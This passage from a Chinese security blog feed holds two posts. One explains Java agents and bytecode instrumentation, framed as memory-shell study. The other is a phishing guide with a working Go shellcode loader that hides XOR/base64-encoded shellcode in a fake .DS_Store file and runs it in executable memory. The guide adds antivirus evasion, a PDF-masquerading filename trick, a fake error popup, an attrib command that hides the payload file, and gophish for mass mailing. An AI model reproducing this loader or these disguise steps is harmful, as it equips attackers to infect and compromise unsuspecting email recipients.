inst)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;hello I`m agentMain!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改<code>MANIFEST.MF</code>为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Premain-Class: PreDemo</span><br><span class="line">Agent-Class: AgentDemo</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>打包重新生成<code>ttagent.jar</code></p><p>修改<code>HelloDemo</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            Thread.sleep(<span class="number">10000</span>);<span class="comment">//每10s输出一次hello!!!</span></span><br><span class="line">            System.out.println(<span class="string">&quot;hello!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建<code>AttachDemo</code>类并通过<code>VirtualMachine</code>这个类帮助我们连接到一个JVM</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttachDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//输入一个pid</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.print(<span class="string">&quot;Enter the pid: &quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">pid</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">        <span class="comment">//连接对应pid的JVM</span></span><br><span class="line">        <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(pid);</span><br><span class="line">        <span class="comment">//加载指定的agentmain</span></span><br><span class="line">        virtualMachine.loadAgent(<span class="string">&quot;D:\\ideaproject\\neicunma\\ttagent\\out\\artifacts\\ttagent_jar\\ttagent.jar&quot;</span>);</span><br><span class="line">        <span class="comment">//断开连接</span></span><br><span class="line">        virtualMachine.detach();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行HelloDemo,查看对应的pid进程</p><p><img src="image-20230611162328641.png" alt="image-20230611162328641"></p><p>确认pid为47292（之前没有这个进程的,运行HelloDemo后出现）</p><p>运行AttachDemo,输入pid</p><p><img src="image-20230611162358554.png" alt="image-20230611162358554"></p><p>查看HelloDemo的控制台发现成功调用ttagent.jar</p><p><img src="image-20230611162419281.png" alt="image-20230611162419281"></p><h2 id="Instrumentation">Instrumentation</h2><p>agentmain中可以看到我们传入了一个<code>Instrumentation</code>类的inst,这个类可以帮助我们修改源程序中已加载的其他类,先讲两个方法<code>getAllLoadedClasses</code>和<code>isModifiableClass</code></p><p><code>getAllLoadedClasses</code>方法可以获取当前已经加载的类<br><code>isModifiableClass</code>方法可以判断当前类是否可修改</p><p>修改AgentDemo如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        <span class="comment">//获取已加载的类</span></span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class aclass : classes) &#123;</span><br><span class="line">            <span class="comment">//输出类的名字和是否可修改</span></span><br><span class="line">            System.out.println(<span class="string">&quot;classname=&quot;</span>+aclass.getName()+<span class="string">&quot;    &quot;</span>+<span class="string">&quot;Modifiable=&quot;</span>+  inst.isModifiableClass(aclass));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新生成<code>ttagent.jar</code>以后,先运行HelloDemo再运行AttachDemo并输入对应的pid,可以看到对应的类被输出了</p><p><img src="image-20230611195826962.png" alt="image-20230611195826962"></p><p>修改HelloDemo为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">HelloDemo</span> <span class="variable">helloDemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloDemo</span>();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            Thread.sleep(<span class="number">10000</span>);</span><br><span class="line">            helloDemo.hello();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来尝试把HelloDemo的hello方法给修改掉,这里需要调用Instrumentation类的两个方法：</p><p><code>addTransformer</code>方法可以向 JVM 注册一个类转换器,从而在类加载时对类进行转换</p><p><code>retransformClasses</code>方法可以重新转换已经加载的类</p><p>addTransformer方法要传入一个<code>ClassFileTransformer</code>类对象,而<code>retransformClasses</code>方法会触发 JVM 重新载入指定的一组类,并调用它们对应的类转换器中的 <code>transform()</code> 方法,将类转换为新的字节码形式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="type">byte</span>[]</span><br><span class="line">    transform(  ClassLoader         loader, <span class="comment">//要转换的类所属的类加载器</span></span><br><span class="line">                String              className, <span class="comment">//要转换的类的全限定名（包括包名）</span></span><br><span class="line">                Class&lt;?&gt;            classBeingRedefined, <span class="comment">//如果当前是重定义（redefinition）操作,则为正在重新定义的类的 Class 对象,否则为 null</span></span><br><span class="line">                ProtectionDomain    protectionDomain, <span class="comment">//要转换的类的保护域（Protection Domain)</span></span><br><span class="line">                <span class="type">byte</span>[]              classfileBuffer) <span class="comment">//表示要转换的类的字节码的字节数组</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalClassFormatException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改AgentDemo类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//获取已加载的类</span></span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class aclass : classes) &#123;</span><br><span class="line">            <span class="comment">//判读当前类是否是HelloDemo类</span></span><br><span class="line">            <span class="keyword">if</span> (aclass.getName().equals(<span class="string">&quot;HelloDemo&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 添加 Transformer</span></span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TransformerDemo</span>(), <span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// 触发 Transformer</span></span><br><span class="line">                inst.retransformClasses(aclass);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建一个TransformerDemo类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//初始化CtClass对象容器</span></span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classpool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="comment">//获取类的搜索路径</span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">classClassPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">                classpool.insertClassPath(classClassPath);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//获取HelloDemo类对象</span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctclass</span> <span class="operator">=</span> classpool.get(<span class="string">&quot;HelloDemo&quot;</span>);</span><br><span class="line">            <span class="comment">//获取hello方法</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> ctclass.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">source</span> <span class="operator">=</span> <span class="string">&quot;&#123;System.out.println(\&quot;hello transformer\&quot;);&#125;&quot;</span>;</span><br><span class="line">            <span class="comment">//修改方法体</span></span><br><span class="line">            method.setBody(source);</span><br><span class="line">            <span class="comment">// 转换为字节数组</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctclass.toBytecode();</span><br><span class="line">            ctclass.detach();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要导入javassist的依赖（两个项目都要导入）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.27.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以上代码的功能主要是判断当前运行的类是否是HelloDemo,如果是的话,则将该类的hello方法输出结果修改为”hello transformer“</p><p>修改MANIFEST.MF加上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Can-Redefine-Classes: <span class="literal">true</span></span><br><span class="line">Can-Retransform-Classes: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>重新生成ttagent.jar以后,同样先运行HelloDemo再运行AttachDemo并输入对应的pid,即可发现HelloDemo类的hello方法被修改了</p><p><img src="image-20230611205507203.png" alt="image-20230611205507203"></p><p>接下来试着将tomcat中的filter给改掉</p><p>先在80端口起一个tomcat,根据端口判断对应的pid</p><p><img src="image-20230611211634046.png" alt="image-20230611211634046"></p><p>可以得到pid为53396</p><p>可以看看已经加载了哪些类</p><p><img src="image-20230611211734944.png" alt="image-20230611211734944"></p><p>可以看到之前的Myfilter类</p><p><img src="image-20230611211817563.png" alt="image-20230611211817563"></p><p>尝试将Myfilter类的doFileter方法进行修改</p><p>但这里总是会报一个错<code>Caused by: java.lang.ClassNotFoundException: javassist.ClassPath</code></p><p><img src="image-20230612094823239.png" alt="image-20230612094823239"></p><p>应该是javassist依赖没有导入的问题,但尝试了很多办法（改版本、将javassist依赖一起导入ttagent.jar、JavaWeb主动添加javassist依赖）,都没有效果</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在Java中,agent是一种可以在运行时修改字节码的机制,它可以用来实现诸如性能监控、代码覆盖率分析、日志记录等功能。java agent主要分为两种——&lt;code&gt;premain&lt;/code&gt;和&lt;code&gt;agentmain&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;pre</summary>
      
    
    
    
    <category term="JAVA" scheme="http://example.com/categories/JAVA/"/>
    
    
    <category term="内存马" scheme="http://example.com/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>邮箱钓鱼学习</title>
    <link href="http://example.com/post/%E9%82%AE%E7%AE%B1%E9%92%93%E9%B1%BC%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/post/%E9%82%AE%E7%AE%B1%E9%92%93%E9%B1%BC%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-06-04T07:35:21.000Z</published>
    <updated>2023-06-14T11:54:04.166Z</updated>
    
    <content type="html"><![CDATA[<p><code>邮箱钓鱼</code>是一种常见的网络攻击手段,它利用伪造的电子邮件来诱导目标用户点击恶意链接或附件,从而窃取敏感信息或执行恶意代码。在进行网络攻击的时候非常常见,毕竟资产最薄弱的部分依旧还是人。</p><h1 id="制作免杀马">制作免杀马</h1><p>邮箱钓鱼攻击的成功与否很大程度上取决于攻击者能否绕过目标系统的防御措施,如杀毒软件、防火墙、沙箱等。因此,学习如何制作免杀的恶意代码是提高邮箱钓鱼攻击效果的关键。</p><p>目前网上有非常多能够帮助shellcode免杀的工具,也可以自己尝试写一写,这里以绕过360为目标</p><p>参考<a href="https://www.freebuf.com/articles/endpoint/323789.html">云山雾隐的shellcode免杀入门文章</a>我们可以得到一个基础的免杀马</p><p>大致原理是对shellcode进行<code>异或加密</code>再<code>base64编码</code>得到密文,然后再对密文进行解码同时加载到内存中,但这种方式同样容易被查杀（2023.6.2测试被杀）,所以我们可以分开写,弄两个文件,一个文件（文件名为.DS_Store）存放我们所加密的shellcode,另外一个可执行文件负责读取shellcode并加载到内存中</p><p>shell.go代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> kk = []<span class="type">byte</span>&#123;<span class="number">0x1b</span>, <span class="number">0x51</span>,<span class="number">0x11</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">content, err := ioutil.ReadFile(<span class="string">&quot;.DS_Store&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error reading file:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="type">string</span>(content)</span><br><span class="line"></span><br><span class="line">charcode := DD(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;charcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DD</span><span class="params">(src <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">ss, _ := base64.StdEncoding.DecodeString(src)</span><br><span class="line"><span class="keyword">var</span> shellcode []<span class="type">byte</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(ss); i++ &#123;</span><br><span class="line">shellcode = <span class="built_in">append</span>(shellcode, ss[i]^kk[<span class="number">1</span>]^kk[<span class="number">2</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shellcode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译生成可执行文件shell.exe</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build -ldflags=&quot;-s -w -H=windowsgui&quot; shell.go</span><br></pre></td></tr></table></figure><p><img src="image-20230604163030198.png" alt="image-20230604163030198"></p><p>双击后可发现木马成功上线（2023.6.4测试）</p><p><img src="image-20230604163823173.png" alt="image-20230604163823173"></p><h1 id="伪装">伪装</h1><p>要想让鱼上钩就必须做好伪装,发送一个shell.exe只有傻子才会点,所以我们一般将文件伪装成一个pdf文档发送</p><p>给受害者</p><h2 id="pdf图标-命名">pdf图标+命名</h2><p>使用<code>iconsext.exe</code>提取一个电脑上自带的pdf图标,我这里选择edge的pdf图标,得到对应的ico文件</p><p>再利用<code>ico替换.exe</code>将shell.exe的图标替换</p><p><img src="image-20230604170107321.png" alt="image-20230604170107321"></p><p>接下来改个后缀,这里不能直接使用pdf.exe,也不能使用空格填充,因为360发现这种文件会直接查杀,所以我们可以找个特殊字符来替换pdf,并且让文件名字尽可能的长,尽量让受害者注意不到最后的exe,这里使用希腊字母的Ρ来代替,名字改为<code>xxxx大学_xxxx学院_xxxx专业_xxxxx个人简历.ΡDF.exe</code></p><h2 id="文档报错">文档报错</h2><p>可以利用GoFileBinder将shell.exe和一个正常的pdf文档绑定起来,打开exe后是一个正常的pdf文件,同时机器也会在后台悄悄上线,但如果我们钓鱼的目标不一样,那么对应打卡的pdf文档也要不一样,有的是一份简历,有的是一份通告……所以最方便的方法就是让受害者打开pdf后直接弹窗报错</p><p>这里使用MessageBoxW这个api,代码如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">MessageBoxPlain(<span class="string">&quot;提示&quot;</span>, <span class="string">&quot;文件已损坏,无法打开&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MessageBoxPlain</span><span class="params">(title, caption <span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> (</span><br><span class="line">        NULL = <span class="number">0</span></span><br><span class="line">        MB_OK = <span class="number">0</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> MessageBox(NULL, caption, title, MB_OK)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MessageBox</span><span class="params">(hwnd <span class="type">uintptr</span>, caption, title <span class="type">string</span>, flags <span class="type">uint</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    ret, _, _ := syscall.NewLazyDLL(<span class="string">&quot;user32.dll&quot;</span>).NewProc(<span class="string">&quot;MessageBoxW&quot;</span>).Call(</span><br><span class="line">        <span class="type">uintptr</span>(hwnd),</span><br><span class="line">        <span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))),</span><br><span class="line">        <span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),</span><br><span class="line">        <span class="type">uintptr</span>(flags))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="type">int</span>(ret)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="image-20230604164839058.png" alt="image-20230604164839058"></p><p>将上述代码写入到shell.go中即可实现弹窗（位置要在syscall.Syscall(addr, 0, 0, 0, 0)上方,要先弹窗再执行shellcode）</p><h2 id="隐藏文件">隐藏文件</h2><p>.DS_Store（Desktop Services Store）文件是苹果公司操作系统 macOS 下用于存储目录的自定义属性和元数据的隐藏文件。这些属性和元数据包括文件夹的位置、图标、背景和视图选项等信息,可以帮助操作系统快速访问和渲染文件夹。在 macOS 的 Finder 中,每个文件夹都有一个与之对应的 .DS_Store 文件,它会随着文件夹的创建、打开、关闭和移动等操作而被创建或更新。</p><p>这里将shellcode代码文件命名为.DS_Store就是为了减少受害者使用解压软件浏览压缩包时的疑心</p><p>可以将.DS_Store文件设为隐藏文件来达到解压完后文件消失的效果,但是如果受害者开启了“查看隐藏项目”,那将会暴露该文件,可以使用以下命令将文件进行进一步的隐藏</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib +S +H .DS_Store</span><br></pre></td></tr></table></figure><p>这下就算开了“查看隐藏项目”也无法看到隐藏的文件</p><p><img src="image-20230604173322404.png" alt="image-20230604173322404"></p><p>这时候就可以打个压缩包发给受害者了（windows自带的压缩功能无法压缩的话使用WinRAR等第三方工具）</p><p>效果：</p><p><img src="image-20230604173628947.png" alt="image-20230604173628947"></p><p><img src="image-20230604173846465.png" alt="image-20230604173846465"></p><h1 id="钓鱼平台">钓鱼平台</h1><p>这里使用gophish搭建钓鱼平台,详细的搭建指南可以查看<a href="http://blog.leanote.com/post/snowming/a6b66097bccd">这篇文章</a></p><p>利用gophish我们可以自定义发件人和批量发送邮件到目标邮箱</p><p>效果截图</p><p><img src="image-20230604214339030.png" alt="image-20230604214339030"></p><p>参考：</p><p><a href="https://xz.aliyun.com/t/11885#toc-4">记一个常规的免杀钓鱼流程</a></p>]]></content>
    
    
      
      
